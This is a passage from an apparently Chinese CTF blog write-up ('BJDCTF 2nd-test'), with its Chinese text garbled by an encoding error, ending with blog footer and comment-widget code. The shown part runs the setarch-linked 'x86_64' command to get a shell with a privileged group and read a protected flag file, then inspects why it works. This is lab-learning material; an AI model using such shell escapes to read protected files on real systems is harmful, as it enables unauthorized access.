<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span> <span class="token assign-left variable">egid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ctf_pwn<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span>
$ x86_64
$ <span class="token function">cat</span> flag
flag<span class="token punctuation">&#123;</span>fca0aaff-26a1-4ad8-adf2-54c7dcef32fc<span class="token punctuation">&#125;</span>
$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„çš„ä¸èƒ½å†ç„ã€‚æˆ‘ä»¬çœ‹çœ‹ä»–çš„åŸç†ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~/guidang/BJD<span class="token comment"># which x86_64</span>
/usr/bin/x86_64
root@kali:~/guidang/BJD<span class="token comment"># ls -l /usr/bin/x86_64</span>
lrwxrwxrwx <span class="token number">1</span> root root /usr/bin/x86_64 -<span class="token operator">></span> setarch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>æƒé™å¾ˆé«˜ã€‚</p>
<blockquote>
<p>The execution domains currently only affects the output of uname -m.For example, on an AMD64 system, running setarch i386 program will.cause program to see i686 instead of x86_64 as the machine type. It also allows to set various personality options. The default program is /bin/sh.</p>
</blockquote>
<p>å¤§æ¦‚æ˜¯åˆ‡æ¢åˆ°åˆ«çš„bash?,åç»­å†é—®åˆ«çš„å¸ˆå‚…å§ã€‚</p>
</div><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>Ev3r</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="http://example.com/2021/03/30/test/" title="BJDCTF 2nd-test">http://example.com/2021/03/30/test/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-Ev3r/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-EV3R 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-Ev3r-line"></use></svg></a> è®¸å¯åè®®ã€‚</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/03/30/off-by-one%E5%8E%9F%E7%90%86%E5%88%A9%E7%94%A8/" rel="prev" title="off_by_oneåŸç†åˆ©ç”¨"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">off_by_oneåŸç†åˆ©ç”¨</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/03/27/Hitcon-stkof/" rel="next" title="Hitcon_stkof"><span class="post-nav-text">Hitcon_stkof</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>å¦‚æœæ‚¨æœ‰ä»»ä½•å…³äºåšå®¢å†…å®¹çš„ç›¸å…³è®¨è®ºï¼Œæ¬¢è¿å‰å¾€ <a href="https://github.com/YunYouJun/yunyoujun.github.io/discussions" target="_blank">GitHub Discussions</a> ä¸æˆ‘äº¤æµã€‚</span><br></div><div id="waline"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js", () => {
  const walineConfig = {"enable":true,"serverURL":"https://waline.yunyoujun.cn","comment":true,"visitor":true,"avatarCDN":"https://cdn.v2ex.com/gravatar/","placeholder":"å¡«å†™é‚®ç®±ï¼Œå¯ä»¥æ”¶åˆ°å›å¤é€šçŸ¥å“¦ï½","requiredFields":["nick"],"el":"#waline","lang":"zh-CN"}
  walineConfig.path = "/2021/03/30/test/"
  new Waline(walineConfig)
}, window.Waline);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">è¿™é‡Œæ˜¯</a></div><div class="copyright"><span>&copy; 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Ev3r</span></div><div class="powered"><span>ç”± <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> é©±åŠ¨ v5.4.0</span><span class="footer-separator">|</span><span>ä¸»é¢˜ - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.2</span></div><div class="live_time"><span>æœ¬åšå®¢å·²è¯ç”Ÿ</span><span id="display_live_time"></span><span class="moe-text">(â—'â—¡'â—)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2021-03-10T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " å¤© " + passHour + " å°æ—¶ " + passMinute + " åˆ† " + passSecond + " ç§’";
}
blog_live_time();
</script></div><div class="footer-custom-text">pwnèœé¸¡</a></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script>const date = new Date();
const today = (date.getMonth() + 1) + "-" + date.getDate()
const mourn_days = ["4-4"]
if (mourn_days.includes(today)) {
  document.documentElement.style.filter = "grayscale(1)";
}</script></div></body></html>